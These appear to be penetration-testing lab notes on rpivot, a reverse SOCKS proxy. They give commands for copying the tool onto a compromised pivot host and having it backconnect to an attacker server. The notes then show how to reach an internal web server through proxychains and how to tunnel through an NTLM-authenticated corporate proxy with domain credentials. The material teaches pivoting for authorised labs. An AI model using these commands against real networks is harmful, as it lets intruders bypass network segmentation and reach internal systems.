[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling.

Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (`172.16.5.135`), and we want to access that using the rpivot proxy.

![[77.webp]]

### Install Python & Clone Repo

```bash
Bailly@htb[/htb]$ sudo git clone <https://github.com/klsecservices/rpivot.git>
Bailly@htb[/htb]$ sudo apt-get install python2.7
```

- We can start rpivot SOCKS proxy server to allow the client to connect on port `9999` and listen on port `9050` for proxy pivot connections :

```bash
Bailly@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Before running `client.py` we will need to transfer rpivot to the target. We can do this using this SCP command :

```bash
Bailly@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

### Launch the Client :

And then from our Ubuntu target pivot host, we can launch the client :

```bash
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```

We will configure proxychains to pivot over our local server on `127.0.0.1:9050` on our attack host, which was initially started by the Python server.

Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of `172.16.5.0/23` at `172.16.5.135:80` using proxychains and Firefox :

```bash
proxychains firefox-esr 172.16.5.135:80
```

![[rpivot_proxychain.webp]]

- Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud.
    
- Some organizations have [HTTP-proxy with NTLM authentication](https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a) configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use `rpivot's client.py` in the following way :
    

```bash
ubuntu@WEB01:~/rpivot$ python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```